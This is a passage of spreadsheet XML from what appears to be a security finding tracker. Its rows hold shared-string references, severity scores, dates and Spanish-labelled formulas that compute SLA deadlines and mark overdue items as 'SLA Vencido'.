      <c r="I294" t="s">
        <v>3080</v>
      </c>
      <c r="J294" t="s">
        <v>2942</v>
      </c>
      <c r="L294" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M294" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N294">
        <v>3.6</v>
      </c>
      <c r="Q294" s="65" t="s">
        <v>3061</v>
      </c>
      <c r="T294" s="1">
        <v>45953</v>
      </c>
      <c r="U294" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>256</v>
      </c>
      <c r="V294" s="1">
        <f t="shared" si="35"/>
        <v>46073</v>
      </c>
      <c r="W294" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB294" s="65" t="s">
        <v>3081</v>
      </c>
      <c r="AC294" s="65" t="s">
        <v>3082</v>
      </c>
      <c r="AD294" s="65" t="s">
        <v>3083</v>
      </c>
      <c r="AE294" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG294" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="295" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A295" s="5">
        <v>294</v>
      </c>
      <c r="B295" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C295" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D295" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G295" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I295" t="s">
        <v>3084</v>
      </c>
      <c r="J295" t="s">
        <v>214</v>
      </c>
      <c r="L295" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M295" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N295">
        <v>3.2</v>
      </c>
      <c r="Q295" s="65" t="s">
        <v>3085</v>
      </c>
      <c r="T295" s="1">
        <v>45953</v>
      </c>
      <c r="U295" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>256</v>
      </c>
      <c r="V295" s="1">
        <f t="shared" si="35"/>
        <v>46073</v>
      </c>
      <c r="W295" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB295" s="65" t="s">
        <v>3086</v>
      </c>
      <c r="AC295" s="65" t="s">
        <v>3087</v>
      </c>
      <c r="AD295" s="65" t="s">
        <v>3088</v>
      </c>
      <c r="AE295" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG295" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="296" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A296" s="5">
        <v>295</v>
      </c>
      <c r="B296" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C296" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D296" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G296" s="60" t="s">
        <v>2679</v>
      </c>
      <c r="I296" s="65" t="s">
        <v>3089</v>
      </c>
      <c r="J296" t="s">
        <v>3090</v>
      </c>
      <c r="L296" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M296" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N296">
        <v>10</v>
      </c>
      <c r="Q296" t="s">
        <v>2683</v>
      </c>
      <c r="T296" s="1">
        <v>45966</v>
      </c>
      <c r="U296" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>243</v>
      </c>
      <c r="V296" s="1">
        <f t="shared" si="35"/>
        <v>45976</v>
      </c>
      <c r="W296" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB296" s="65" t="s">
        <v>3091</v>
      </c>
      <c r="AC296" s="65" t="s">
        <v>1985</v>
      </c>
      <c r="AD296" s="65" t="s">
        <v>3092</v>
      </c>
      <c r="AE296" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG296" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="297" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A297" s="5">
        <v>296</v>
      </c>
      <c r="B297" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C297" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D297" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G297" s="60" t="s">
        <v>2679</v>
      </c>
      <c r="H297" t="s">
        <v>3093</v>
      </c>
      <c r="I297" t="s">
        <v>3094</v>
      </c>
      <c r="J297" t="s">
        <v>3095</v>
      </c>
      <c r="L297" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M297" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N297">
        <v>8</v>
      </c>
      <c r="Q297" t="s">
        <v>3096</v>
      </c>
      <c r="T297" s="1">
        <v>45966</v>
      </c>
      <c r="U297" s="76">
        <f t="shared" ref="U297:U300" ca="1" si="37">TODAY()-T297</f>
        <v>243</v>
      </c>
      <c r="V297" s="1">
        <f t="shared" ref="V297:V300" si="38">IF(M297="Critical",T297+10,IF(M297="High",T297+30,IF(M297="Bad",T297+30,IF(M297="Medium",T297+90,IF(M297="Warm",T297+90,IF(M297="Low",T297+120,IF(M297="Fair",T297+120,IF(M297="Neutral",T297+120,""))))))))</f>
        <v>45996</v>
      </c>
      <c r="W297" s="76" t="str">
        <f t="shared" ref="W297:W300" ca="1" si="39">IF(M297="Critical",IF(U297&gt;10,"SLA Vencido","En SLA"),IF(M297="High",IF(U297&gt;30,"SLA Vencido","En SLA"),IF(M297="Bad",IF(U297&gt;30,"SLA Vencido","En SLA"),IF(M297="Medium",IF(U297&gt;90,"SLA Vencido","En SLA"),IF(M297="Warm",IF(U297&gt;90,"SLA Vencido","En SLA"),IF(M297="Low",IF(U297&gt;120,"SLA Vencido","En SLA"),IF(M297="Fair",IF(U297&gt;120,"SLA Vencido","En SLA"),IF(M297="Neutral",IF(U297&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB297" s="65" t="s">
        <v>3097</v>
      </c>
      <c r="AC297" s="65" t="s">
        <v>3098</v>
      </c>
      <c r="AD297" s="65" t="s">
        <v>3099</v>
      </c>
      <c r="AE297" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG297" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="298" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A298" s="5">
        <v>297</v>
      </c>
      <c r="B298" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C298" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D298" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G298" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I298" t="s">
        <v>3100</v>
      </c>
      <c r="J298" t="s">
        <v>1186</v>
      </c>
      <c r="L298" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M298" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N298">
        <v>3</v>
      </c>
      <c r="Q298" t="s">
        <v>3101</v>
      </c>
      <c r="T298" s="1">
        <v>45966</v>
      </c>
      <c r="U298" s="76">
        <f t="shared" ca="1" si="37"/>
        <v>243</v>
      </c>
      <c r="V298" s="1">
        <f t="shared" si="38"/>
        <v>46086</v>
      </c>
      <c r="W298" s="76" t="str">
        <f t="shared" ca="1" si="39"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB298" s="65" t="s">
        <v>3102</v>
      </c>
      <c r="AC298" s="65" t="s">
        <v>3103</v>
      </c>
      <c r="AD298" s="65" t="s">
        <v>3104</v>
      </c>
      <c r="AE298" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG298" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="299" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A299" s="5">
        <v>298</v>
      </c>
      <c r="B299" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C299" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D299" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G299" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I299" t="s">
        <v>3105</v>
      </c>
      <c r="L299" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M299" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N299">
        <v>2.8</v>
      </c>
      <c r="Q299" t="s">
        <v>3101</v>
      </c>
      <c r="T299" s="1">
        <v>45966</v>
      </c>
      <c r="U299" s="76">
        <f t="shared" ca="1" si="37"/>
        <v>243</v>
      </c>
      <c r="V299" s="1">
        <f t="shared" si="38"/>
        <v>46086</v>
      </c>
      <c r="W299" s="76" t="str">
        <f t="shared" ca="1" si="39"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB299" s="65" t="s">
        <v>3106</v>
      </c>
      <c r="AC299" s="65" t="s">
        <v>3107</v>
      </c>
      <c r="AD299" s="65" t="s">
        <v>3108</v>
      </c>
      <c r="AE299" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG299" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="300" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A300" s="5">
        <v>299</v>
      </c>
      <c r="B300" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C300" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D300" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G300" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="H300" t="s">
        <v>3109</v>
      </c>
      <c r="I300" t="s">
        <v>3110</v>
      </c>
      <c r="J300" t="s">
        <v>1115</v>
      </c>
      <c r="L300" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M300" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N300">
        <v>5.4</v>
      </c>
      <c r="Q300" t="s">
        <v>1425</v>
      </c>
      <c r="T300" s="1">
        <v>45966</v>
      </c>
      <c r="U300" s="55">
        <f t="shared" ca="1" si="37"/>
        <v>243</v>
      </c>
      <c r="V300" s="1">
        <f t="shared" si="38"/>
        <v>46056</v>
      </c>
      <c r="W300" s="56" t="str">
        <f t="shared" ca="1" si="39"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB300" s="65" t="s">
        <v>3111</v>
      </c>
      <c r="AC300" s="65" t="s">
        <v>3112</v>
      </c>
      <c r="AD300" s="65" t="s">
        <v>3113</v>
      </c>
      <c r="AE300" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG300" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="301" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A301" s="5">
        <v>300</v>
      </c>
      <c r="B301" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C301" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D301" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G301" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="I301" t="s">
        <v>3114</v>
      </c>
      <c r="J301" t="s">
        <v>80</v>
      </c>
      <c r="L301" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M301" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N301">
        <v>3.7</v>
      </c>
      <c r="Q301" t="s">
        <v>1425</v>
      </c>
      <c r="T301" s="1">
        <v>45966</v>
      </c>
      <c r="U301" s="55">
        <f t="shared" ref="U301:U305" ca="1" si="40">TODAY()-T301</f>
        <v>243</v>
      </c>
      <c r="V301" s="1">
        <f t="shared" ref="V301:V305" si="41">IF(M301="Critical",T301+10,IF(M301="High",T301+30,IF(M301="Bad",T301+30,IF(M301="Medium",T301+90,IF(M301="Warm",T301+90,IF(M301="Low",T301+120,IF(M301="Fair",T301+120,IF(M301="Neutral",T301+120,""))))))))</f>
        <v>46086</v>
      </c>
      <c r="W301" s="56" t="str">
        <f t="shared" ref="W301:W305" ca="1" si="42">IF(M301="Critical",IF(U301&gt;10,"SLA Vencido","En SLA"),IF(M301="High",IF(U301&gt;30,"SLA Vencido","En SLA"),IF(M301="Bad",IF(U301&gt;30,"SLA Vencido","En SLA"),IF(M301="Medium",IF(U301&gt;90,"SLA Vencido","En SLA"),IF(M301="Warm",IF(U301&gt;90,"SLA Vencido","En SLA"),IF(M301="Low",IF(U301&gt;120,"SLA Vencido","En SLA"),IF(M301="Fair",IF(U301&gt;120,"SLA Vencido","En SLA"),IF(M301="Neutral",IF(U301&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB301" s="65" t="s">
        <v>3115</v>
      </c>
      <c r="AC301" s="65" t="s">
        <v>3116</v>
      </c>
      <c r="AD301" s="65" t="s">
        <v>3117</v>
      </c>
      <c r="AE301" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG301" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="302" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A302" s="5">
        <v>301</v>
      </c>
      <c r="B302" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C302" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D302" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G302" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="I302" t="s">
        <v>3118</v>
      </c>
      <c r="J302" t="s">
        <v>1271</v>
      </c>
      <c r="L302" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M302" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N302">
        <v>3</v>
      </c>
      <c r="Q302" t="s">
        <v>1425</v>
      </c>
      <c r="T302" s="1">
        <v>45966</v>
      </c>
      <c r="U302" s="55">
        <f t="shared" ca="1" si="40"/>
        <v>243</v>
      </c>
      <c r="V302" s="1">
        <f t="shared" si="41"/>
        <v>46086</v>
      </c>
      <c r="W302" s="56" t="str">
        <f t="shared" ca="1" si="42"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB302" s="65" t="s">
        <v>3119</v>
      </c>
      <c r="AC302" s="65" t="s">
        <v>3120</v>
      </c>
      <c r="AD302" s="65" t="s">
        <v>3121</v>
      </c>
      <c r="AE302" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG302" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="303" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A303" s="5">
        <v>302</v>
      </c>
      <c r="B303" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C303" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D303" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G303" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="I303" t="s">
        <v>3122</v>
      </c>
      <c r="J303" t="s">
        <v>3123</v>
      </c>
      <c r="L303" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M303" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N303">
        <v>3.7</v>
      </c>
      <c r="Q303" t="s">
        <v>1425</v>
      </c>
      <c r="T303" s="1">
        <v>45966</v>
      </c>
      <c r="U303" s="55">
        <f t="shared" ca="1" si="40"/>
        <v>243</v>
      </c>
      <c r="V303" s="1">
        <f t="shared" si="41"/>
        <v>46086</v>
      </c>
      <c r="W303" s="56" t="str">
        <f t="shared" ca="1" si="42"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB303" s="65" t="s">
        <v>3124</v>
      </c>
      <c r="AC303" s="65" t="s">
        <v>3125</v>
      </c>
      <c r="AD303" s="65" t="s">
        <v>3126</v>
      </c>
      <c r="AE303" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG303" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="304" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A304" s="5">
        <v>303</v>
      </c>
      <c r="B304" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C304" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D304" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G304" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="I304" t="s">
        <v>3127</v>
      </c>
      <c r="J304" s="65" t="s">
        <v>3128</v>
      </c>
      <c r="L304" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M304" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N304">
        <v>3.1</v>
      </c>
      <c r="Q304" t="s">
        <v>1425</v>
      </c>
      <c r="T304" s="1">
        <v>45966</v>
      </c>
      <c r="U304" s="55">
        <f t="shared" ca="1" si="40"/>
        <v>243</v>
      </c>
      <c r="V304" s="1">
        <f t="shared" si="41"/>
        <v>46086</v>
      </c>
      <c r="W304" s="56" t="str">
        <f t="shared" ca="1" si="42"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB304" s="65" t="s">
        <v>3129</v>
      </c>
      <c r="AC304" s="65" t="s">
        <v>3130</v>
      </c>
      <c r="AD304" s="65" t="s">
        <v>3131</v>
      </c>
      <c r="AE304" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG304" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="305" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A305" s="5">
        <v>304</v>
      </c>
      <c r="B305" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C305" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D305" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G305" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="H305" t="s">
        <v>3132</v>
      </c>
      <c r="I305" t="s">
        <v>3133</v>
      </c>
      <c r="J305" t="s">
        <v>421</v>
      </c>
      <c r="L305" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M305" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N305">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q305" s="65" t="s">
        <v>3134</v>
      </c>
      <c r="T305" s="1">
        <v>45967</v>
      </c>
      <c r="U305" s="55">
        <f t="shared" ca="1" si="40"/>
        <v>242</v>
      </c>
      <c r="V305" s="1">
        <f t="shared" si="41"/>
        <v>46057</v>
      </c>
      <c r="W305" s="56" t="str">
        <f t="shared" ca="1" si="42"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB305" s="65" t="s">
        <v>3135</v>
      </c>
      <c r="AC305" s="65" t="s">
        <v>3068</v>
      </c>
      <c r="AD305" s="65" t="s">
        <v>3069</v>
      </c>
      <c r="AE305" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG305" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="306" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A306" s="5">
        <v>305</v>
      </c>
      <c r="B306" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C306" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D306" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G306" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="H306" t="s">
        <v>3136</v>
      </c>
      <c r="I306" t="s">
        <v>3137</v>
      </c>
      <c r="J306" s="65" t="s">
        <v>80</v>
      </c>
      <c r="L306" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M306" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N306">
        <v>4.4000000000000004</v>
      </c>
      <c r="Q306" s="65" t="s">
        <v>3138</v>
      </c>
      <c r="T306" s="1">
        <v>45967</v>
      </c>
      <c r="U306" s="55">
        <f t="shared" ref="U306:U310" ca="1" si="43">TODAY()-T306</f>
        <v>242</v>
      </c>
      <c r="V306" s="1">
        <f t="shared" ref="V306:V310" si="44">IF(M306="Critical",T306+10,IF(M306="High",T306+30,IF(M306="Bad",T306+30,IF(M306="Medium",T306+90,IF(M306="Warm",T306+90,IF(M306="Low",T306+120,IF(M306="Fair",T306+120,IF(M306="Neutral",T306+120,""))))))))</f>
        <v>46057</v>
      </c>
      <c r="W306" s="56" t="str">
        <f t="shared" ref="W306:W310" ca="1" si="45">IF(M306="Critical",IF(U306&gt;10,"SLA Vencido","En SLA"),IF(M306="High",IF(U306&gt;30,"SLA Vencido","En SLA"),IF(M306="Bad",IF(U306&gt;30,"SLA Vencido","En SLA"),IF(M306="Medium",IF(U306&gt;90,"SLA Vencido","En SLA"),IF(M306="Warm",IF(U306&gt;90,"SLA Vencido","En SLA"),IF(M306="Low",IF(U306&gt;120,"SLA Vencido","En SLA"),IF(M306="Fair",IF(U306&gt;120,"SLA Vencido","En SLA"),IF(M306="Neutral",IF(U306&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB306" s="65" t="s">
        <v>3139</v>
      </c>
      <c r="AC306" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD306" s="65" t="s">
        <v>1993</v>
      </c>
      <c r="AE306" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG306" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="307" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A307" s="5">
        <v>306</v>
      </c>
      <c r="B307" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C307" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D307" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G307" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="H307" t="s">
        <v>3140</v>
      </c>
      <c r="I307" t="s">
        <v>3141</v>
      </c>
      <c r="J307" s="65" t="s">
        <v>3142</v>
      </c>
      <c r="L307" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M307" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N307">
        <v>4.2</v>
      </c>
      <c r="Q307" s="65" t="s">
        <v>3143</v>
      </c>
      <c r="T307" s="1">
        <v>45967</v>
      </c>
      <c r="U307" s="55">
        <f t="shared" ca="1" si="43"/>
        <v>242</v>
      </c>
      <c r="V307" s="1">
        <f t="shared" si="44"/>
        <v>46057</v>
      </c>
      <c r="W307" s="56" t="str">
        <f t="shared" ca="1" si="45"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB307" s="65" t="s">
        <v>3144</v>
      </c>
      <c r="AC307" s="65" t="s">
        <v>3145</v>
      </c>
      <c r="AD307" s="65" t="s">
        <v>3146</v>
      </c>
      <c r="AE307" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG307" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="308" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A308" s="5">
        <v>307</v>
      </c>
      <c r="B308" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C308" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D308" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G308" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="I308" t="s">
        <v>3147</v>
      </c>
      <c r="J308" s="65" t="s">
        <v>1115</v>
      </c>
      <c r="L308" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M308" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N308">
        <v>3</v>
      </c>
      <c r="Q308" s="65" t="s">
        <v>3138</v>
      </c>
      <c r="T308" s="1">
        <v>45967</v>
      </c>
      <c r="U308" s="55">
        <f t="shared" ca="1" si="43"/>
        <v>242</v>
      </c>
      <c r="V308" s="1">
        <f t="shared" si="44"/>
        <v>46087</v>
      </c>
      <c r="W308" s="56" t="str">
        <f t="shared" ca="1" si="45"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB308" s="65" t="s">
        <v>3148</v>
      </c>
      <c r="AC308" s="65" t="s">
        <v>3048</v>
      </c>
      <c r="AD308" s="65" t="s">
        <v>3049</v>
      </c>
      <c r="AE308" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG308" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="309" spans="1:33" ht="275.5" x14ac:dyDescent="0.35">
      <c r="A309" s="5">
        <v>308</v>
      </c>
      <c r="B309" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C309" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D309" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G309" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="I309" t="s">
        <v>3149</v>
      </c>
      <c r="J309" s="65" t="s">
        <v>1186</v>
      </c>
      <c r="L309" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M309" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N309">
        <v>2.8</v>
      </c>
      <c r="Q309" s="65" t="s">
        <v>3138</v>
      </c>
      <c r="T309" s="1">
        <v>45967</v>
      </c>
      <c r="U309" s="55">
        <f t="shared" ca="1" si="43"/>
        <v>242</v>
      </c>
      <c r="V309" s="1">
        <f t="shared" si="44"/>
        <v>46087</v>
      </c>
      <c r="W309" s="56" t="str">
        <f t="shared" ca="1" si="45"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB309" s="65" t="s">
        <v>3102</v>
      </c>
      <c r="AC309" s="65" t="s">
        <v>3150</v>
      </c>
      <c r="AD309" s="65" t="s">
        <v>3104</v>
      </c>
      <c r="AE309" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG309" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="310" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A310" s="5">
        <v>309</v>
      </c>
      <c r="B310" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C310" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D310" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G310" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="I310" t="s">
        <v>3151</v>
      </c>
      <c r="J310" s="65" t="s">
        <v>3152</v>
      </c>
      <c r="L310" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M310" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N310">
        <v>2.8</v>
      </c>
      <c r="Q310" s="65" t="s">
        <v>3138</v>
      </c>
      <c r="T310" s="1">
        <v>45967</v>
      </c>
      <c r="U310" s="55">
        <f t="shared" ca="1" si="43"/>
        <v>242</v>
      </c>
      <c r="V310" s="1">
        <f t="shared" si="44"/>
        <v>46087</v>
      </c>
      <c r="W310" s="56" t="str">
        <f t="shared" ca="1" si="45"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB310" s="65" t="s">
        <v>3153</v>
      </c>
      <c r="AC310" s="65" t="s">
        <v>3154</v>
      </c>
      <c r="AD310" s="65" t="s">
        <v>3108</v>
      </c>
      <c r="AE310" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG310" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="311" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A311" s="5">
        <v>310</v>
      </c>
      <c r="B311" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C311" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D311" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G311" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J311" t="s">
        <v>3156</v>
      </c>
      <c r="L311" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M311" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q311" t="s">
        <v>2459</v>
      </c>
      <c r="T311" s="1">
        <v>45941</v>
      </c>
      <c r="U311" s="55">
        <f t="shared" ref="U311:U320" ca="1" si="46">TODAY()-T311</f>
        <v>268</v>
      </c>
      <c r="V311" s="1">
        <f t="shared" ref="V311:V320" si="47">IF(M311="Critical",T311+10,IF(M311="High",T311+30,IF(M311="Bad",T311+30,IF(M311="Medium",T311+90,IF(M311="Warm",T311+90,IF(M311="Low",T311+120,IF(M311="Fair",T311+120,IF(M311="Neutral",T311+120,""))))))))</f>
        <v>46061</v>
      </c>
      <c r="W311" s="56" t="str">
        <f t="shared" ref="W311:W320" ca="1" si="48">IF(M311="Critical",IF(U311&gt;10,"SLA Vencido","En SLA"),IF(M311="High",IF(U311&gt;30,"SLA Vencido","En SLA"),IF(M311="Bad",IF(U311&gt;30,"SLA Vencido","En SLA"),IF(M311="Medium",IF(U311&gt;90,"SLA Vencido","En SLA"),IF(M311="Warm",IF(U311&gt;90,"SLA Vencido","En SLA"),IF(M311="Low",IF(U311&gt;120,"SLA Vencido","En SLA"),IF(M311="Fair",IF(U311&gt;120,"SLA Vencido","En SLA"),IF(M311="Neutral",IF(U311&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB311" s="65" t="s">
        <v>3157</v>
      </c>
      <c r="AC311" s="65" t="s">
        <v>3158</v>
      </c>
      <c r="AE311" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG311" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="312" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A312" s="5">
        <v>311</v>
      </c>
      <c r="B312" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C312" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D312" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G312" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="H312">
        <v>0</v>
      </c>
      <c r="J312" t="s">
        <v>1486</v>
      </c>
      <c r="L312" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M312" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q312" t="s">
        <v>2459</v>
      </c>
      <c r="T312" s="1">
        <v>45937</v>
      </c>
      <c r="U312" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>272</v>
      </c>
      <c r="V312" s="1">
        <f t="shared" si="47"/>
        <v>46057</v>
      </c>
      <c r="W312" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB312" t="s">
        <v>1810</v>
      </c>
      <c r="AC312" s="65" t="s">
        <v>3159</v>
      </c>
